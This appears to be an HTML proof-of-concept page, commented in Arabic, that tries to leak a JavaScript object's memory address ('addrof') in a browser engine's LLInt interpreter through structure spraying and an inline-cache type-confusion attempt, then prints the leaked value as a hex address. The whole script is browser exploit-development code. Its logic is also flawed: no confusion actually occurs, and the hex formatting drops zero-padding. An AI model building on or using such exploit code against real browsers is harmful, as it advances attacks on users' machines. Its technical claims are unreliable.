<!DOCTYPE html>
<html>
<body>
<button onclick="test()">اختبار: LLInt Addrof via Structure Spray</button>
<pre id="log" style="font-size:11px;"></pre>
<script>
function log(m) { document.getElementById('log').textContent += m + '\n'; }

function test() {
    log('=== LLInt Addrof Test (No JIT) ===\n');

    // 1. أنشئ آلاف المصفوفات من نوع Double
    var doubles = [];
    for (var i = 0; i < 10000; i++) {
        doubles.push([1.1, 2.2, 3.3]);
    }

    // 2. أنشئ كائنات عادية (Objects)
    var objects = [];
    for (var i = 0; i < 10000; i++) {
        objects.push({ a: 1, b: 2, c: 3 });
    }

    // 3. حاول قراءة عنوان كائن عبر إجبار LLInt على الخلط
    // في JIT، نستخدم Phi Node. في LLInt، نحاول إجبار Inline Cache على الفشل.
    var target = { secret: "I am an object" };
    var leaked_addr = null;

    // دالة تعيد تارة Double وتارة Object
    function confuse(x) {
        if (x === 0) return doubles[0]; // Double Array
        return target; // Object
    }

    // سخّن الـ Inline Cache لي توقع Double
    for (var i = 0; i < 100; i++) confuse(0);

    // الآن مرر قيمة غير متوقعة (1)
    // LLInt سيفحص StructureID، لكن لو كان هناك تعارض...
    try {
        var result = confuse(1);
        // إذا حدث Type Confusion، سيتعامل مع الكائن كأنه Double
        var d = result[0];
        
        if (typeof d === 'number' && !isNaN(d) && d > 1e10) {
            log('[!!!] LEAKED DOUBLE VALUE: ' + d);
            // تحويل Double إلى Hex (عنوان الذاكرة)
            var buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = d;
            var view = new DataView(buf);
            var low = view.getUint32(0, true);
            var high = view.getUint32(4, true);
            log('[!!!] HEX ADDR: 0x' + high.toString(16) + low.toString(16));
        } else {
            log('[-] No leak. Value is: ' + d);
        }
    } catch(e) {
        log('Error: ' + e);
    }

    log('=== Test Finished ===');
}
</script>
</body>
</html>
